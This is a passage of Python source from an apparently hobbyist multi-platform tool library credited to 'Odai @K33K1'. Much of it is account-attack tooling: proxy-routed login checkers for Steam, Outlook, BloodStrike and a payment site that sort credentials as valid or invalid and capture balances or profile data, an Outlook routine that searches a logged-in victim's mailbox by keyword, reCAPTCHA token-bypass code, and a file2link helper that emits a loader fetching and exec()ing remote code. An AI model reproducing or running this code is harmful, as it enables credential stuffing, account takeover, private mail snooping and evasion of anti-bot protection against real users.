            headers = {'authority': 'www.instagram.com','accept': '*/*','accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/accounts/signup/username/','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"SM-N985F"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"13.0.0"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36','x-asbd-id': '129477','x-csrftoken': csrftoken,'x-ig-app-id': '1217981644879628','x-ig-www-claim': '0','x-instagram-ajax': '1017024069','x-requested-with': 'XMLHttpRequest','x-web-device-id': '6A0F5B62-9C1F-4682-859D-61D83C2F0940'}
            data = {'username': username}
            r = requests.post('https://www.instagram.com/api/v1/users/check_username/', cookies=cookies, headers=headers, data=data, proxies = Proxy.build(proxies))
            text = r.text
            if 'available":true' in text:
                return {"status": "available","username": username,"Dev": Dev}
            elif 'available":false' in text:
                return {"status": "taken","username": username,"Dev": Dev}
            else:
                return {"status": "unknown","username": username,"Dev": Dev}
        except Exception as e:
            return {"status": "error","error": str(e),"Dev": Dev}
    def checkemail(self, mail, proxy=None):
        try:
            response = requests.post("https://i.instagram.com/api/v1/users/check_email/",headers={"User-Agent": "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Accept": "*/*"},data={"email": mail},proxies=proxy,timeout=20)
            res_lower = response.text.lower()
            if response.status_code == 429: return {"status":"blocked","message":"too many requests (429)","email":mail,"Dev":"Odai @K33K1"}
            if ("text/html" in res_lower or "<!doctype html" in res_lower or "<html" in res_lower): return {"status":"blocked","message":"html response (blocked)","email":mail,"Dev":"Odai @K33K1"}
            if ('"spam":true' in res_lower and '"status":"fail"' in res_lower): return {"status":"blocked","message":"spam detected","email":mail,"Dev":"Odai @K33K1"}
            if '"error_type":"invalid_email"' in res_lower: return {"status":"invalid email","message":"invalid email format","email":mail,"Dev":"Odai @K33K1"}
            if ('"error_type":"email_is_taken"' in res_lower or '"email_is_taken":true' in res_lower):return {"status":"taken","message":"this email is already exists in instagram","email":mail,"Dev":"Odai @K33K1"}
            if ('"email_is_taken":false' in res_lower or '"available":true' in res_lower): return {"status":"not taken","message":"this email is available","email":mail,"Dev":"Odai @K33K1"}
            if "email_is_taken" in res_lower: return {"status":"taken","message":"this email is already exists in instagram","email":mail,"Dev":"Odai @K33K1"}
            return {"status":"unknown response","email":mail,"Dev":"Odai @K33K1"}
        except Exception as e:return {"status":"error","error": e,"Dev":"Odai @K33K1"}
class steam:
    @staticmethod
    def login(username,password,proxy=None):
        USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";PROXY=proxy
        def rsa_encrypt_password(password,mod_hex,exp_hex):
            try:
                modulus=int(mod_hex,16);exponent=int(exp_hex,16)
                key=RSA.construct((modulus,exponent))
                cipher=PKCS1_v1_5.new(key)
                encrypted=cipher.encrypt(password.encode('utf-8'))
                return urllib.parse.quote_plus(b64encode(encrypted).decode('utf-8'))
            except:return ""
        session=requests.Session()
        if PROXY:session.proxies.update(PROXY)
        session.headers.update({"User-Agent":USER_AGENT})
        clean_username=re.sub(r"@.*","",username)
        try:
            rsa_payload={"donotcache":str(int(time.time()*1000)),"username":clean_username}
            rsa_res=session.post(
                "https://steamcommunity.com/login/getrsakey/",
                data=rsa_payload,
                headers={
                    "Origin":"https://steamcommunity.com",
                    "X-Requested-With":"XMLHttpRequest",
                    "Accept":"*/*",
                    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"
                }
            )
            rsa_data=rsa_res.json()
            if not rsa_data.get("success",False):
                rsa_data["Dev"]="Odai @K33K1"
                return "BAN",rsa_data
            mod=rsa_data.get("publickey_mod")
            exp=rsa_data.get("publickey_exp")
            timestamp=rsa_data.get("timestamp")
        except:return "FAIL",{}

        encrypted_pass=rsa_encrypt_password(password,mod,exp)
        if not encrypted_pass:return "FAIL",{}
        try:
            login_payload={
                "donotcache":str(int(time.time()*1000)),
                "password":encrypted_pass,
                "username":clean_username,
                "twofactorcode":"",
                "emailauth":"",
                "loginfriendlyname":"",
                "captchagid":"-1",
                "captcha_text":"",
                "emailsteamid":"",
                "rsatimestamp":timestamp,
                "remember_login":"false",
                "oauth_client_id":"3638BFB1"
            }
            login_res=session.post(
                "https://steamcommunity.com/login/dologin/",
                data=login_payload,
                headers={
                    "Origin":"https://steamcommunity.com",
                    "X-Requested-With":"XMLHttpRequest",
                    "Referer":"https://steamcommunity.com/mobilelogin?oauth_client_id=3638BFB1&oauth_scope=read_profile%20write_profile%20read_client%20write_client",
                    "Accept":"*/*",
                    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"
                }
            )
            login_data=login_res.json()
            login_data["Dev"]="Odai @K33K1"
            if login_data.get("success",False):return "SUCCESS",session
            elif login_data.get("captcha_needed")==True:return "BAN",login_data
            elif login_data.get("requires_twofactor")==True or login_data.get("emailauth_needed")==True:
                return login_data
            elif "incorrect" in login_data.get("message","").lower():return "FAIL",login_data
            else:return "FAIL",login_data
        except:return "FAIL",{}
    @staticmethod
    def info(session):
        try:
            acc_res=session.get(
                "https://store.steampowered.com/account/",
                headers={
                    "Referer":"https://steamcommunity.com/",
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
                }
            )
            captured_data={}
            email_match=re.search(r'>Email address:</span> <span class="account_data_field">(.*?)</span>',acc_res.text)
            if email_match:captured_data["Email"]=email_match.group(1).strip()
            country_match=re.search(r'class="account_data_field">(.*?)</span>',acc_res.text)
            if country_match:captured_data["Country"]=country_match.group(1).strip()
            balance_match=re.search(r'<div class="accountData price">(.*?)</div>',acc_res.text)
            if balance_match:captured_data["Balance"]=balance_match.group(1).strip()
            level_match=re.search(r'class="friendPlayerLevelNum">(.*?)</span>',acc_res.text)
            if level_match:captured_data["Level"]=level_match.group(1).strip()
            years_match=re.search(r'steamyears_(\d+)',acc_res.text)
            if years_match:captured_data["Years Badge"]=years_match.group(1)
            return captured_data
        except:return {}
class roblox:
    @staticmethod
    def usernamecheck(u):
        import httpx,time
        def check(x):
            try:
                r=httpx.get(f"https://auth.roblox.com/v1/usernames/validate?birthday=2005-03-04T00:00:00.000Z&context=Signup&username={x}",timeout=5)
                if r.status_code==429:
                    time.sleep(3)
                    return check(x)
                data=r.json()
                if data.get("code")==0:return True
                return False
            except:return False
        res=check(u)
        return {"available":res,"Dev":"Odai @K33K1"}
def inviteinfo(invite):
    DEV = "Odai @K33K1"
    if "discord.gg/" in invite:invite_code = invite.split("discord.gg/")[-1].split("/")[0]
    elif "discord.com/invite/" in invite:invite_code = invite.split("discord.com/invite/")[-1].split("/")[0]
    else:invite_code = invite.strip()
    url = f"https://discord.com/api/v9/invites/{invite_code}"
    params = {
        "with_counts": "true",
        "with_expiration": "true"
    }
    headers = {
        "User-Agent": "Mozilla/5.0"
    }
    try:
        response = requests.get(url, params=params, headers=headers)
        data = response.json()
        guild = data.get('guild', {})
        inviter = data.get('inviter', {})
        channel = data.get('channel', {})
        def format_time(t):
            if not t:return None
            try:
                dt = datetime.fromisoformat(t.replace("Z", "+00:00"))
                return dt.strftime("%Y-%m-%d %H:%M:%S")
            except:return t
        def asset_url(kind):
            if guild.get('id') and guild.get(kind):return f"https://cdn.discordapp.com/{kind}s/{guild['id']}/{guild[kind]}.png"
        result = {
            "raw": data,

            "server": {
                "name": guild.get('name'),
                "id": guild.get('id'),
                "description": guild.get('description'),
                "members": data.get('approximate_member_count'),
                "online": data.get('approximate_presence_count'),
                "boost_level": guild.get('premium_tier'),
                "boosts": guild.get('premium_subscription_count'),
                "verification_level": guild.get('verification_level'),
                "nsfw": guild.get('nsfw'),
                "features": guild.get('features', [])
            },

            "inviter": {
                "username": inviter.get('username'),
                "display_name": inviter.get('global_name'),
                "id": inviter.get('id')
            },

            "invite": {
                "code": data.get('code'),
                "channel": channel.get('name'),
                "expires": format_time(data.get('expires_at')),
                "temporary": data.get('flags') == 2
            },

            "assets": {
                "icon": asset_url("icon"),
                "banner": asset_url("banner"),
                "splash": asset_url("splash")
            },
            "Dev": DEV,
        }
        return result
    except Exception as e:return {
            "dev": DEV,
            "error": str(e)
        }
class bloodstrike:
    @staticmethod
    def login(username,password):
        import requests,time,random
        url="https://sdk-os-me.mpsdk.easebar.com/api/users/login/v2/nt_passport/auth"
        tid=str(int(time.time()*1000));rid=str(random.randint(100000000,999999999))
        params={'game_id':"10001",'cp':"a",'debug_mode':"0",'cv':"3.16.1",'gv':"122",'jf_game_id':"g83naxx1me",'time_zone':"Asia/Amman",'time_offset':"10800",'lang':"en-US",'app_channel':"g83naxx1me@google_play",'ci':"74a1e1a5ea663e50",'ext_ci':"242d2a55118b4acb6de5a513fe4efdfe233d6fd90450edce314423f4bdc509f4",'ci_code':"0",'mcount_app_key':"2uTViL8JBBDJQwIwNfgGUTVA0vmbQFgn",'mcount_transaction_id':f"74a1e1a5ea663e50_{tid}_{rid}",'transid':f"74a1e1a5ea663e50_{tid}_{random.randint(100000000,999999999)}"}
        data={'device_id':"1781575885",'account_type':"25",'account':username,'password':password,'scene':"login_bind"}
        headers={'User-Agent':"com.netease.newspikeme/122 NeteaseMobileGame/a3.16.1 (2201117PG;33)",'Connection':"Keep-Alive",'Accept-Encoding':"gzip",'Accept-Charset':"UTF-8",'Accept-Language':"en-us"}
        try:
            r=requests.post(url,params=params,data=data,headers=headers);t=r.text
            if 'login_token' in t:return {"status":"success","Dev":"Odai @K33K1"}
            elif 'Account does not exist' in t:return {"status":"not_found","Dev":"Odai @K33K1"}
            elif '429 Too Many Requests' in t:return {"status":"retry","Dev":"Odai @K33K1"}
            elif 'Incorrect account or password.' in t:return {"status":"bad password","Dev":"Odai @K33K1"}
            else:return {"status":"unknown","Dev":"Odai @K33K1"}
        except:return {"status":"error","Dev":"Odai @K33K1"}
class pipinfo:
    @staticmethod
    def info(package):
        DEV = "Odai - @K33K1"
        try:
            package = package.strip()
            stats_url = f"https://pypistats.org/api/packages/{package}/overall"
            r_stats = requests.get(stats_url)
            if r_stats.status_code == 200:
                stats_data = r_stats.json()
                data_entries = stats_data.get("data", [])
                total_downloads = sum(entry.get("downloads", None) for entry in data_entries)
            else:total_downloads = None
            pypi_url = f"https://pypi.org/pypi/{package}/json"
            r_pypi = requests.get(pypi_url)
            if r_pypi.status_code != 200:return {"Dev": DEV, "error": "Package not found on PyPI"}
            pypi_data = r_pypi.json()
            info = pypi_data.get("info", {})
            pypi_info = {
                "name": info.get("name"),
                "version": info.get("version"),
                "author": info.get("author"),
                "author_email": info.get("author_email"),
                "maintainer": info.get("maintainer"),
                "maintainer_email": info.get("maintainer_email"),
                "home_page": info.get("home_page"),
                "license": info.get("license"),
                "license_expression": info.get("license_expression"),
                "bio": info.get("summary"),
                "description": info.get("description"),
                "description_content_type": info.get("description_content_type"),
                "classifiers": info.get("classifiers"),
                "requires_dist": info.get("requires_dist"),
                "requires_python": info.get("requires_python"),
                "project_url": info.get("project_url"),
                "project_urls": info.get("project_urls"),
                "keywords": info.get("keywords"),
                "platform": info.get("platform"),
                "docs_url": info.get("docs_url"),
                "bugtrack_url": info.get("bugtrack_url"),
                "package_url": info.get("package_url"),
                "release_url": info.get("release_url"),
                "dynamic": info.get("dynamic"),
                "provides_extra": info.get("provides_extra"),
                "yanked": info.get("yanked"),
                "yanked_reason": info.get("yanked_reason"),
            }
            return {"package": package,"total_downloads": total_downloads,"public info": pypi_info,"Dev": DEV}
        except Exception as e:return {"error": str(e), "Dev": DEV}
class pinterest:
    @staticmethod
    def info(username, download=False):
        DEV = "Odai - @K33K1"
        try:
            username = username.strip()
            all_pins = []
            bookmark = ""
            data = None
            while True:
                url = f"https://api.pinterest.com/v3/pidgets/users/{username}/pins/"
                params = {}
                if bookmark:params["bookmarks"] = bookmark
                r = requests.get(url, params=params)
                if r.status_code != 200:return {"Dev": DEV, "error": "Account not found or request failed"}
                data = r.json()
                pins = data.get("data", {}).get("pins", [])
                all_pins.extend(pins)
                bookmark = data.get("data", {}).get("bookmarks", [])
                if not bookmark or bookmark == ["-end-"]:break
                bookmark = bookmark[0]
            user = data.get("data", {}).get("user", {})
            pins_data = []
            for i, pin in enumerate(all_pins, start=1):
                desc = pin.get("description")
                is_video = pin.get("is_video", False)
                media_url = None
                media_type = "video" if is_video else "image"
                if is_video:
                    vlist = pin.get("videos", {}).get("video_list", {})
                    if vlist:media_url = list(vlist.values())[0].get("url")
                else:media_url = pin.get("images", {}).get("564x", {}).get("url")
                pins_data.append({
                    "index": i,
                    "type": media_type,
                    "description": desc,
                    "url": media_url
                })
            if download:
                folder = f"downloads_{username}"
                os.makedirs(folder, exist_ok=True)
                for i, pin in enumerate(pins_data):
                    try:
                        if pin["url"]:
                            r = requests.get(pin["url"])
                            ext = ".mp4" if pin["type"] == "video" else ".jpg"
                            with open(f"{folder}/{i}{ext}", "wb") as f:
                                f.write(r.content)
                    except:pass
            return {
                "user": {
                    "name": user.get("full_name"),
                    "id": user.get("id"),
                    "url": user.get("profile_url"),
                    "pins_count": user.get("pin_count"),
                    "followers": user.get("follower_count"),
                    "about": user.get("about")
                },

                "pins_count": len(all_pins),
                "pins": pins_data,
                "Dev": DEV,
            }
        except Exception as e:
            return {"error": str(e),"Dev": DEV,}
class recaptcha:
    def __init__(self):self.session=requests.Session()
    def V3(self,siteUrl="",siteKey=""):
        try:
            ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            html=self.session.get(siteUrl).text
            try:renderUrl=re.findall(r'<script[^>]+src="(https://www\.google\.com/recaptcha/[^"]+)"',html)[0]
            except:renderUrl='https://www.google.com/recaptcha/enterprise.js'
            js=self.session.get(renderUrl).text
            m=re.search(r"po\.src\s*=\s*'(https://[^']+)';",js)
            if m:v=m.group(1).split('/')[5];api=renderUrl.split('.js')[0];api=api+'2' if 'api2' not in api and 'enterprise' not in api else api
            else:
                parsed=urlparse(renderUrl);q=parse_qs(parsed.query)
                v=q.get('v',[None])[0] or renderUrl.split('/')[5]
                api=renderUrl.split('.js')[0]
            domain=siteUrl.split('/')[2]
            co=base64.b64encode(f'https://{domain}:443'.encode()).decode().replace('=','.')
            h={"accept":"*/*","origin":"https://www.google.com","user-agent":ua,"referer":siteUrl}
            anchor=self.session.get(f'{api}/anchor',params={'ar':'1','k':siteKey,'co':co,'hl':'en','v':v,'size':'invisible','cb':'abc123'},headers=h).text
            t=anchor.split('recaptcha-token" value="')[1].split('"')[0]
            rh=h.copy();rh['referer']=f'{api}/anchor?ar=1&k={siteKey}&co={co}&hl=en&v={v}&size=invisible&cb=abc123'
            r=self.session.post(f'{api}/reload?k={siteKey}',data={'v':v,'co':co,'reason':'q','size':'invisible','hl':'en','k':siteKey,'c':t,'chr':'','vh':'','bg':''},headers=rh).text
            final=r.split('"rresp","')[1].split('"')[0]
            return {"site":siteUrl,"siteKey":siteKey,"token":final,"v":v,"api":api,"Dev":"Odai - @K33K1"}
        except Exception as e:return {"error":str(e),"Dev":"Odai - @K33K1"}
    @staticmethod
    def V2(siteUrl="https://example.com/", siteKey=""):
        try:
            userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            site_html = requests.get(siteUrl).text
            try:
                renderUrl = re.findall(
                    r'<script[^>]+src="(https://www\.google\.com/recaptcha/[^"]+)"',
                    site_html
                )[0]
            except:
                renderUrl = 'https://www.google.com/recaptcha/enterprise.js'
            js = requests.get(renderUrl).text
            match = re.search(r"po\.src\s*=\s*'(https://[^']+)';", js)
            if match:
                v = match.group(1).split('/')[5]
                api = renderUrl.split('.js')[0]
                if 'api2' not in api and 'enterprise' not in api:
                    api += '2'
            else:
                parsed = urlparse(renderUrl)
                query_params = parse_qs(parsed.query)
                v = query_params.get('v', [None])[0]
                if v is None:
                    v = renderUrl.split('/')[5]
                api = renderUrl.split('.js')[0]
            domain = siteUrl.split('/')[2]
            co = base64.b64encode(
                f'https://{domain}:443'.encode()
            ).decode().replace('=', '.')
            headers = {
                "accept": "*/*",
                "origin": "https://www.google.com",
                "user-agent": userAgent,
                "referer": siteUrl
            }
            anchor_params = {
                'ar': '1',
                'k': siteKey,
                'co': co,
                'hl': 'en',
                'v': v,
                'size': 'invisible',
                'cb': 'abc123'
            }
            anchor = requests.get(
                f'{api}/anchor',
                params=anchor_params,
                headers=headers
            ).text
            recaptcha_token = anchor.split('recaptcha-token" value="')[1].split('"')[0]
            reload_headers = headers.copy()
            reload_headers['referer'] = f'{api}/anchor?ar=1&k={siteKey}&co={co}&hl=en&v={v}&size=invisible&cb=abc123'
            reload_data = {
                'v': v,
                'co': co,
                'reason': 'q',
                'size': 'invisible',
                'hl': 'en',
                'k': siteKey,
                'c': recaptcha_token,
                'chr': '',
                'vh': '',
                'bg': ''
            }
            reload = requests.post(
                f'{api}/reload?k={siteKey}',
                data=reload_data,
                headers=reload_headers
            ).text
            final_token = reload.split('"rresp","')[1].split('"')[0]
            return {
                "site": siteUrl,
                "siteKey": siteKey,
                "token": final_token,
                "v": v,
                "api": api,
                "Dev": "Odai - @K33K1",
            }
        except Exception as e:
            return {"error": str(e),"Dev": "Odai - @K33K1"}
class damkom:
    @staticmethod
    def login(username, password, proxy=None):
        Dev = "Odai - @K33K1"
        try:
            proxies = None
            if proxy:proxies = Proxy.build(proxy)
            res = requests.post(
                'https://kd1s.com/',
                cookies={
                    '_csrf': 'a5a5049a84889a874bdbf74877fa05daf4b0b77665a2169989a499bc4d8175bca%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22KE-j2ZxYybWv9MXIAwB0RHwFGTq5jdoJ%22%3B%7D'
                },
                headers={
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
                    'Referer': 'https://kd1s.com/'
                },
                data={
                    'LoginForm[username]': username,
                    'LoginForm[password]': password,
                    '_csrf': 'PRf9Frq-_BRAbe3TU2U1bLz8qFZS1Lp7sXb94RVlgqV2UtB8iOSETTkPuqVqKG0l_YvqZgCczT32IozUfwHt7w=='
                },
                proxies=proxies
            ).text
            if "اسم المستخدم أو كلمة المرور غير صحيحة" in res:
                return {
                    "status": "invalid",
                    'user': username,
                    'password': password,
                    "Dev": Dev,
                }
            elif "رصيدك الحالي" in res:
                try:coin = res.split("رصيدك الحالي")[0].split("<span>")[1].split("</span>")[0]
                except:coin = None
                return {
                    "status": "success",
                    "balance": coin,
                    "username": username,
                    "Dev": Dev,
                }
            else:
                return {
                    "status": "unknown",
                    "Dev": Dev
                    
                }
        except Exception as e:
            return {
                "status": "error",
                "error": str(e),
                "Dev": Dev,
            }
class Outlook:
    @staticmethod
    def login(email, password, keyword=None):
        result = {
            "status": False,
            "email": email,
            "password": password,
            "cid": "",
            "token": "",
            "profile": {
                "name": "",
                "country": "",
                "birth_date": ""
            },
            "keyword_result": {
                "keyword": keyword,
                "found": False,
                "count": 0
            },
            "Dev": "Odai @K33K1"
        }
        
        try:
            headers_auth = {
                "User-Agent": str(user_agent.generate_user_agent()),
                "X-Requested-With": "com.microsoft.outlooklite",
            }
            
            params = {
                "client_info": "1",
                "haschrome": "1",
                "login_hint": email,
                "mkt": "en",
                "response_type": "code",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
            }
            
            url_auth = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"
            res_auth = requests.get(url_auth, headers=headers_auth, timeout=15)
            
            cok = res_auth.cookies.get_dict()
            host = res_auth.text.split('"urlPost":"')[1].split('",')[0]
            ppft = res_auth.text.split('name=\\"PPFT\\" id=\\"i0327\\" value=\\"')[1].split('\\"')[0]
            ad_url = res_auth.url.split('haschrome=1')[0]
            payload = {
                "i13": "1",
                "login": email,
                "loginfmt": email,
                "type": "11",
                "LoginOptions": "1",
                "passwd": password,
                "PPFT": ppft,
                "PPSX": "PassportR",
                "i19": "9960"
            }
            
            headers_login = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": str(user_agent.generate_user_agent()),
                "Referer": f"{ad_url}haschrome=1",
                "Cookie": f"MSPRequ={cok.get('MSPRequ')};uaid={cok.get('uaid')}; RefreshTokenSso={cok.get('RefreshTokenSso')}; MSPOK={cok.get('MSPOK')}; OParams={cok.get('OParams')};"
            }
            
            res_login = requests.post(host, data=payload, headers=headers_login, allow_redirects=False, timeout=15)
            login_cookies = res_login.cookies.get_dict()
            if not any(key in login_cookies for key in ["JSH", "JSHP", "ANON", "WLSSC"]):
                return result
            
            result["status"] = True
            auth_code = res_login.headers.get('Location', '').split('code=')[1].split('&')[0]
            cid = login_cookies.get('MSPCID', '').upper()
            result["cid"] = cid
            
            url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
            data = {
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": auth_code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            
            token_res = requests.post(url, data=data, timeout=15).json()
            token = token_res.get("access_token", "")
            result["token"] = token
            
            if not token:return result
            result["profile"] = Outlook._get_profile(token, cid)
            if keyword:
                result["keyword_result"] = Outlook._search_keyword(token, cid, keyword)
            
            return result
            
        except Exception:
            return result
    
    @staticmethod
    def _get_profile(token, cid):
        profile = {"name": "Unknown", "country": "Unknown", "birth_date": "Unknown"}
        
        try:
            headers_info = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            profile_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
            response = requests.get(profile_url, headers=headers_info, timeout=10)
            
            if response.status_code != 200:
                return profile
           
            r = response.json()
            if 'names' in r and isinstance(r['names'], list) and len(r['names']) > 0:
                profile["name"] = r['names'][0].get('displayName', 'Unknown')
            elif 'displayName' in r:
                profile["name"] = r['displayName']
            elif 'userPrincipalName' in r:
                profile["name"] = r['userPrincipalName'].split('@')[0]
            if 'accounts' in r and isinstance(r['accounts'], list) and len(r['accounts']) > 0:
                profile["country"] = r['accounts'][0].get('location', 'Unknown')
            elif 'country' in r:
                profile["country"] = r['country']
                
            day = r.get('birthDay', '')
            month = r.get('birthMonth', '')
            year = r.get('birthYear', '')
            
            if day and month and year:
                if len(str(day)) == 1:
                    day = f"0{day}"
                if len(str(month)) == 1:
                    month = f"0{month}"
                profile["birth_date"] = f"{day}/{month}/{year}"
            elif year:
                profile["birth_date"] = str(year)
            
        except Exception:
            pass
        
        return profile
    
    @staticmethod
    def _search_keyword(token, cid, keyword):
        result = {
            "keyword": keyword,
            "found": False,
            "count": 0
        }
        
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            headers_search = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Egypt Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                            {"Term": {"DistinguishedFolderName": "SentItems"}},
                            {"Term": {"DistinguishedFolderName": "Inbox"}}
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": keyword},
                    "RefiningQueries": None,
                    "Size": 50,
                    "Sort": [
                        {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                        {"Field": "Time", "SortDirection": "Desc"}
                    ],
                    "EnableTopResults": True,
                    "TopResultsCount": 5
                }],
                "LogicalId": str(uuid.uuid4())
            }
            
            response = requests.post(search_url, json=payload, headers=headers_search, timeout=15)
            
            if response.status_code != 200:return result
            result_data = response.json()
            result_text = json.dumps(result_data).lower()
            count = result_text.count(keyword.lower())
            result["count"] = count
            result["found"] = count > 0
        except Exception:pass
        return result
class telegram:
    @staticmethod
    def checkusername(username):
        result = {
            "status": False,
            "username": username,
            "state": "unknown",
            "Dev": "Odai @K33K1"
        }
        try:
            session = requests.Session()
            r = session.get('https://fragment.com/', timeout=15)
            html = r.text
            hash_match = html.split('hash=')[1].split('"')[0] if 'hash=' in html else '4a701c9acc3b33fd8e' 
            response = session.post(
                'https://fragment.com/api',
                params={'hash': hash_match},
                headers={
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://fragment.com',
                    'referer': 'https://fragment.com/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest'
                },
                data={
                    'type': 'usernames',
                    'query': username,
                    'method': 'searchAuctions'
                },
                timeout=15
            )
            response_text = response.text
            result["status"] = True
            response_lower = response_text.lower()
            if 'available' in response_lower:result["state"] = "for sell"
            elif 'taken' in response_lower:result["state"] = "on telegram"
            elif 'unavailable' in response_lower:result["state"] = "available"
            elif 'free' in response_lower:result["state"] = "available"
            return result     
        except:return result
class weatherinfo:
    @staticmethod
    def info():
        DEV = "Odai - @K33K1"
        try:
            def get_ip_info():
                try:
                    r = requests.get("https://ipinfo.io/json", timeout=6)
                    r.raise_for_status()
                    return r.json()
                except:
                    return {}

            def get_major_city_from_coords(lat, lon):
                try:
                    url = "https://nominatim.openstreetmap.org/reverse"
                    params = {"format": "jsonv2", "lat": lat, "lon": lon, "accept-language": "en"}
                    headers = {"User-Agent": "weather-script/1.0"}
                    r = requests.get(url, params=params, headers=headers, timeout=6)
                    r.raise_for_status()
                    data = r.json()
                    addr = data.get("address", {})
                    return addr.get("city") or addr.get("town") or addr.get("county") or addr.get("state") or data.get("display_name")
                except:
                    return None

            def get_weather_for_city(city):
                try:
                    url = f"https://wttr.in/{city}?format=j1"
                    r = requests.get(url, timeout=8)
                    r.raise_for_status()
                    return r.json()
                except:
                    return None

            ip_info = get_ip_info()
            fallback_city = ip_info.get("city")
            loc = ip_info.get("loc")

            major_city = None
            if loc:
                lat, lon = loc.split(",")
                major_city = get_major_city_from_coords(lat.strip(), lon.strip())

            if not major_city:
                major_city = fallback_city

            data = get_weather_for_city(major_city)

            if data and "weather" in data:
                today = data['weather'][0]
                forecast = []

                for hour in today.get('hourly', []):
                    time = hour.get('time', "0")
                    try:
                        t_int = int(time)
                        hour_24 = (t_int // 100) % 24
                        period = "AM" if hour_24 < 12 else "PM"
                        hour_12 = hour_24 % 12 or 12
                        hour_label = f"{hour_12:02d} {period}"
                    except:
                        hour_label = time

                    temp = hour.get('tempC', '?')
                    forecast.append({
                        "time": hour_label,
                        "tempC": temp
                    })

                return {
                    "city": major_city,
                    "forecast": forecast,
                    "Dev": DEV
                }

            else:
                return {
                    "error": "Failed to fetch weather",
                    "Dev": DEV
                }

        except Exception as e:
            return {
                "error": str(e),
                "Dev": DEV
            }
class file2link:
    @staticmethod
    def convert(file_path: str):
        start_time = time.time()
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                code = f.read()
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'http://pastie.org',
                'Referer': 'http://pastie.org/',
                'User-Agent': 'Mozilla/5.0',
            }
            data = {
                'language': 'plaintext',
                'content': code,
            }
            res = requests.post(
                'http://pastie.org/pastes/create',
                headers=headers,
                data=data,
                verify=False,
                timeout=10
            ).text
            match = re.search(
                r'<div class="item"><a href="([^"]+)">raw</a></div>',
                res
            )
            if not match:
                return {
                    "status": False,
                    "error": "Failed to extract link",
                    "Dev": 'Odai @K33K1'
                }
            link = match.group(1)
            output_code = (
                "from requests import get as odai\n"
                f"K33K1 = odai('http://pastie.org{link}')\n"
                "exec(K33K1.text)"
            )
            output_path = "output-K33K1.py"
            with open(output_path, "w", encoding="utf-8") as f:
                f.write(output_code)
            end_time = time.time()
            return {
                "status": True,
                "output_file": output_path,
                "paste_link": f"http://pastie.org{link}",
                "time_sec": round(end_time - start_time, 2),
                "Dev": "Odai @K33K1"
            }

        except Exception as e:
            return {
                "status": False,
                "error": str(e),
                "Dev": "Odai @K33K1"
            }
class namefromphone:
    def __init__(self):
